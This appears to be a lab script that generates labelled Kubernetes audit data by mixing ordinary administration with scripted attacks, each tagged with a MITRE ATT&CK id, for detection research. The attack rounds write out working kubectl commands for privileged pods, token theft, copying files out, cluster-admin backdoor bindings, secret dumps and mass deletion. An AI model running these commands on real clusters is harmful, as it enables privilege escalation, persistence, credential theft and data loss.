#!/usr/bin/env bash
# Inside the lab VM, internet disconnected. A small company on one cluster: ordinary work by four principals and attacks
# by an insider and by a stolen SRE identity, in R randomised rounds. Every step is labelled BEFORE it runs.
#   label:  ordinary | attack     actor: who acts      technique: MITRE ATT&CK for Containers id or a work type
set -uo pipefail
R=${R:-3}
L=/opt/lab/labels.jsonl; : > "$L"
ts() { date -u +%FT%T.%3NZ; }
run() {  # run LABEL ACTOR TECH WHAT -- command...
  local label=$1 actor=$2 tech=$3 what=$4; shift 5
  local t0; t0=$(ts); "$@" >/dev/null 2>&1; local rc=$?; sleep 1
  printf '{"t0":"%s","t1":"%s","label":"%s","actor":"%s","technique":"%s","what":"%s","rc":%d}\n' "$t0" "$(ts)" "$label" "$actor" "$tech" "$what" "$rc" >> "$L"
  sleep 1; }
K="kubectl"
as() { echo "--as=$1"; }
setup() {
  for ns in dev prod monitoring ci; do $K create namespace $ns >/dev/null 2>&1; done
  $K create rolebinding alice-edit --clusterrole=edit --user=alice -n dev >/dev/null 2>&1
  $K create clusterrolebinding bob-admin --clusterrole=cluster-admin --user=bob >/dev/null 2>&1
  $K create clusterrolebinding carol-view --clusterrole=view --user=carol >/dev/null 2>&1
  $K create serviceaccount deployer -n ci >/dev/null 2>&1
  $K create rolebinding ci-edit --clusterrole=edit --serviceaccount=ci:deployer -n prod >/dev/null 2>&1
  $K create rolebinding mallory-edit --clusterrole=edit --user=mallory -n dev >/dev/null 2>&1
  $K create deployment api --image=nginx:1.27 -n prod >/dev/null 2>&1
  $K create deployment web --image=nginx:1.27 -n dev >/dev/null 2>&1
  sleep 20
}
CI="system:serviceaccount:ci:deployer"
pod() { $K get pod -n "$1" -l app="$2" -o name | head -1 | cut -d/ -f2; }
ordinary() {
  local i=$1
  run ordinary alice deploy "deploy app-$i" -- $K $(as alice) -n dev create deployment app-$i --image=nginx:1.27
  run ordinary alice scale "scale app-$i" -- $K $(as alice) -n dev scale deployment app-$i --replicas=2
  run ordinary alice read "logs of web" -- $K $(as alice) -n dev logs deploy/web
  run ordinary alice config "config map" -- $K $(as alice) -n dev create configmap cfg-$i --from-literal=k=v
  run ordinary alice restart "rollout restart" -- $K $(as alice) -n dev rollout restart deployment/web
  run ordinary carol read "list pods everywhere" -- $K $(as carol) get pods -A
  run ordinary carol read "describe deployments" -- $K $(as carol) -n prod get deployments -o wide
  run ordinary ci deploy "ci deploys api" -- $K $(as $CI) -n prod set image deployment/api nginx=nginx:1.27
  run ordinary ci secret "ci creates app secret" -- $K $(as $CI) -n prod create secret generic db-$i --from-literal=password=lab
  run ordinary ci read "ci reads its app secret" -- $K $(as $CI) -n prod get secret db-$i
  run ordinary bob debug "exec for debugging" -- $K $(as bob) -n prod exec deploy/api -- nginx -v
  run ordinary bob monitoring "monitoring daemonset" -- $K $(as bob) -n monitoring create -f /opt/lab/manifests/node-exporter.yaml
  run ordinary bob backup "backup cronjob" -- $K $(as bob) -n prod create cronjob backup-$i --image=busybox:1.36 --schedule="0 2 * * *" -- sh -c "echo backup"
  run ordinary bob expose "NodePort for a demo" -- $K $(as bob) -n dev expose deployment web --name web-np-$i --type NodePort --port 80
  run ordinary bob rbac "read-only role for a team" -- $K $(as bob) -n dev create role reader-$i --verb=get,list --resource=pods
  run ordinary bob cleanup "delete old app" -- $K $(as bob) -n dev delete deployment app-$i
  run ordinary bob cleanup "delete monitoring daemonset" -- $K $(as bob) -n monitoring delete daemonset node-exporter
}
attacks() {
  local i=$1
  run attack mallory T1610 "privileged pod" -- $K $(as mallory) -n dev apply -f /opt/lab/manifests/priv.yaml
  run attack mallory T1611 "host filesystem mount" -- $K $(as mallory) -n dev apply -f /opt/lab/manifests/hostpath.yaml
  run attack mallory T1611 "host network and PID" -- $K $(as mallory) -n dev apply -f /opt/lab/manifests/hostns.yaml
  run attack mallory T1611 "SYS_ADMIN capability" -- $K $(as mallory) -n dev apply -f /opt/lab/manifests/caps.yaml
  run attack mallory T1552.007 "list secrets in all namespaces (denied)" -- $K $(as mallory) get secrets -A
  run attack mallory T1552.007 "read prod secret (denied)" -- $K $(as mallory) -n prod get secret db-$i
  run attack mallory T1528 "steal service-account token via exec" -- $K $(as mallory) -n dev exec deploy/web -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
  run attack mallory T1048 "copy files out (kubectl cp)" -- $K $(as mallory) -n dev cp $(pod dev web):/etc/passwd /tmp/loot-$i
  run attack mallory T1609 "exec into prod (denied)" -- $K $(as mallory) -n prod exec deploy/api -- id
  run attack mallory T1485 "mass delete in dev" -- $K $(as mallory) -n dev delete configmaps --all
  run attack bob-stolen T1098 "cluster-admin backdoor binding" -- $K $(as bob) create clusterrolebinding sys-upd-$i --clusterrole=cluster-admin --serviceaccount=default:default
  run attack bob-stolen T1098 "wildcard cluster role" -- $K $(as bob) create clusterrole god-$i --verb='*' --resource='*'
  run attack bob-stolen T1543 "daemonset in kube-system" -- $K $(as bob) -n kube-system create -f /opt/lab/manifests/ks-ds.yaml
  run attack bob-stolen T1610 "pod in kube-system" -- $K $(as bob) -n kube-system run kproxy-$i --image=busybox:1.36 -- sleep 3600
  run attack bob-stolen T1053.007 "beacon cronjob" -- $K $(as bob) -n default create cronjob upd-$i --image=busybox:1.36 --schedule="*/5 * * * *" -- sh -c "echo beacon"
  run attack bob-stolen T1528 "mint 1-year token for default SA" -- $K $(as bob) -n default create token default --duration=8760h
  run attack bob-stolen T1528 "client certificate request" -- $K $(as bob) create -f /opt/lab/manifests/csr.yaml
  run attack bob-stolen T1546 "mutating admission webhook" -- $K $(as bob) create -f /opt/lab/manifests/webhook.yaml
  run attack bob-stolen T1552.007 "dump all secrets" -- $K $(as bob) get secrets -A -o yaml
  run attack bob-stolen T1485 "delete prod deployment" -- $K $(as bob) -n prod delete deployment api
  run attack anonymous T1046 "anonymous API probing" -- curl -sk "https://$(docker port lab-control-plane 6443/tcp | head -1)/api/v1/namespaces/kube-system/secrets"
  $K -n kube-system delete daemonset ks-agent >/dev/null 2>&1; $K delete csr lab-csr >/dev/null 2>&1
  $K delete mutatingwebhookconfiguration lab-hook >/dev/null 2>&1
  $K -n dev delete pod priv hostp hostns capsys --ignore-not-found >/dev/null 2>&1
  $K -n prod create deployment api --image=nginx:1.27 >/dev/null 2>&1; sleep 8
}
setup
for r in $(seq 1 "$R"); do
  if (( RANDOM % 2 )); then ordinary $r; attacks $r; else attacks $r; ordinary $r; fi
done
echo "done: $(wc -l < "$L") labelled steps ($(grep -c '"attack"' "$L") attacks, $(grep -c '"ordinary"' "$L") ordinary)"
